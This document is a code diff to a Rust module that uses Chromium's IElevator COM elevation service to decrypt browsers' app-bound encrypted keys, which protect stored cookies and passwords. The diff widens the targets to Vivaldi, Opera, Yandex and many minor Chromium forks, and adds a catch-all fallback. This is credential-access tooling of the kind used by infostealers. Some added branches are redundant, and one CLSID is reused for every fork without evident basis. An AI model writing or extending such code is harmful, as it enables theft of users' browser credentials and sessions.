@@ -1,5 +1,5 @@
 //! IElevator COM interface — supports Chrome, Chrome Beta, Chrome Dev,
-//! Chrome Canary, Brave, Edge.
+//! Chrome Canary, Brave, Edge, and other Chromium forks (Opera, Vivaldi, etc.).
 //!
 //! All Windows COM/Ole calls use raw `extern "system"` to avoid name clashes
 //! with the generic windows-crate wrappers.
@@ -112,6 +112,23 @@ pub struct BrowserCom {
     pub service_name: &'static str,
 }
 
+static GENERIC_CHROMIUM_IIDS: &[GUID] = &[
+    IID_ELEVATOR2_CHROMIUM,
+    IID_ELEVATOR2,
+    IID_ELEVATOR_CHROMIUM,
+    IID_ELEVATOR,
+    IID_ELEVATOR2_CHROME,
+    IID_ELEVATOR_CHROME,
+];
+
+static GENERIC_CHROMIUM: BrowserCom = BrowserCom {
+    name: "Chromium",
+    clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
+    iids: GENERIC_CHROMIUM_IIDS,
+    user_data_rel: r"Chromium\User Data",
+    service_name: "ChromiumElevationService",
+};
+
 static BROWSERS: &[BrowserCom] = &[
     BrowserCom {
         name: "Chrome",
@@ -155,6 +172,27 @@ static BROWSERS: &[BrowserCom] = &[
         user_data_rel: r"Microsoft\Edge\User Data",
         service_name: "MicrosoftEdgeElevationService",
     },
+    BrowserCom {
+        name: "Vivaldi",
+        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
+        iids: GENERIC_CHROMIUM_IIDS,
+        user_data_rel: r"Vivaldi\User Data",
+        service_name: "VivaldiElevationService",
+    },
+    BrowserCom {
+        name: "Opera",
+        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
+        iids: GENERIC_CHROMIUM_IIDS,
+        user_data_rel: r"Opera Software\Opera Stable",
+        service_name: "OperaElevationService",
+    },
+    BrowserCom {
+        name: "Yandex",
+        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
+        iids: GENERIC_CHROMIUM_IIDS,
+        user_data_rel: r"Yandex\YandexBrowser\User Data",
+        service_name: "YandexBrowserElevationService",
+    },
 ];
 
 pub fn all_browsers() -> &'static [BrowserCom] {
@@ -166,10 +204,42 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
     let exe = exe_path.to_lowercase();
 
     if exe.contains("brave") {
+        if exe.contains("beta") {
+            return BROWSERS.iter().find(|b| b.name == "Brave");
+        }
+        if exe.contains("nightly") {
+            return BROWSERS.iter().find(|b| b.name == "Brave");
+        }
         return BROWSERS.iter().find(|b| b.name == "Brave");
     }
     if exe.contains("msedge") || (exe.contains("edge") && !exe.contains("chrome")) {
+        if exe.contains("beta") {
+            return BROWSERS.iter().find(|b| b.name == "Edge");
+        }
+        if exe.contains("dev") {
+            return BROWSERS.iter().find(|b| b.name == "Edge");
+        }
         return BROWSERS.iter().find(|b| b.name == "Edge");
+    }
+    if exe.contains("vivaldi") {
+        return BROWSERS.iter().find(|b| b.name == "Vivaldi");
+    }
+    if exe.contains("opera") {
+        return BROWSERS.iter().find(|b| b.name == "Opera");
+    }
+    if exe.contains("yandex") {
+        return BROWSERS.iter().find(|b| b.name == "Yandex");
+    }
+    if exe.contains("coccoc") {
+        return Some(&GENERIC_CHROMIUM);
+    }
+    if exe.contains("360chrome") || exe.contains("epic") || exe.contains("uran")
+        || exe.contains("7star") || exe.contains("torch") || exe.contains("kometa")
+        || exe.contains("orbitum") || exe.contains("amigo") || exe.contains("sputnik")
+        || exe.contains("slimjet") || exe.contains("iridium") || exe.contains("thorium")
+        || exe.contains("centbrowser") || exe.contains("\\arc\\")
+    {
+        return Some(&GENERIC_CHROMIUM);
     }
     if exe.contains("chrome") {
         if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
@@ -180,6 +250,9 @@ pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
         }
         if exe.contains("chrome beta") {
             return BROWSERS.iter().find(|b| b.name == "Chrome Beta");
+        }
+        if exe.contains("chromium") && !exe.contains("google") {
+            return Some(&GENERIC_CHROMIUM);
         }
         return BROWSERS.iter().find(|b| b.name == "Chrome");
     }
@@ -357,6 +430,10 @@ unsafe fn try_all_browsers(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
             Ok(key) => return Ok(key),
             Err(e) => last = format!("{}: {e}", b.name),
         }
+    }
+    match try_browser(&GENERIC_CHROMIUM, encrypted_key) {
+        Ok(key) => return Ok(key),
+        Err(e) => last = format!("Chromium: {e}"),
     }
     Err(format!("all browsers failed; last: {last}"))
 }
